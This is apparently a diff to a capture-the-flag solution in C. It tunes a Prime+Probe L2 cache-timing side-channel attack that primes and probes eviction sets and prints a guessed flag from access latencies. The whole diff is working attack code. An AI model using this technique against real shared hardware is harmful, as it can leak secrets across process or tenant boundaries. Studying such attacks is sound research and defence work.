@@ -11,12 +11,10 @@
 #define LINE_SIZE 64
 #define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-#define REPEATS 600
-#define THRESHOLD 150
+#define REPEATS 2000
 
 volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
-uint64_t scores[NUM_L2_CACHE_SETS];
 
 static inline uint64_t rdtsc() {
     unsigned hi, lo;
@@ -75,51 +73,58 @@ int main() {
     srand(rdtscp());
 
     while(1) {
-        int order[NUM_L2_CACHE_SETS];
-        for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
-            scores[i] = 0;
+
+        uint64_t scores[NUM_L2_CACHE_SETS] = {0};
+
+        
 
         for(int r = 0; r < REPEATS; r++) {
+            int perm[NUM_L2_CACHE_SETS];
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
+                perm[i] = i;
+            }
 
-        /* PRIME all sets */
-            for(int set = 0; set < NUM_L2_CACHE_SETS; set++)
-                for(int w = 0; w < WAYS; w++)
-                    tmp ^= *eviction_sets[set][w];
+            shuffle(perm);
 
-            wait_cycles(60000);
-
-            for(int i=0;i<NUM_L2_CACHE_SETS;i++) order[i]=i;
-            shuffle(order);
-
-            /* PROBE all sets */
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
-                int set = order[i];
+                int set = perm[i];
 
+                /* PRIME this set */
+                for(int w = 0; w < WAYS; w++) {
+                    tmp ^= *eviction_sets[set][w];
+                }
+
+                wait_cycles(2000);
+
+                /* PROBE this set */
                 uint64_t start = rdtscp();
 
-                for(int w = WAYS-1; w >= 0; w--)
+                for(int w = 0; w < WAYS; w++) {
                     tmp ^= *eviction_sets[set][w];
+                }
 
-                uint64_t latency = rdtscp() - start;
+                uint64_t end = rdtscp();
 
-                scores[set] += latency;
+                scores[set] += (end - start);
             }
         }
-
         int best_set = 0;
         uint64_t best_latency = 0;
 
         for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-            if(scores[set] > best_latency) {
-                best_latency = scores[set];
+
+            uint64_t avg = scores[set] / REPEATS;
+
+            if(avg > best_latency) {
+                best_latency = avg;
                 best_set = set;
             }
         }
 
-        printf("Guessed flag: %d (score=%lu)\n", best_set, best_latency);
+        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
-        wait_cycles(10000 + (rand() % 20000));
+        wait_cycles(2000);
     }
 
     return 0;
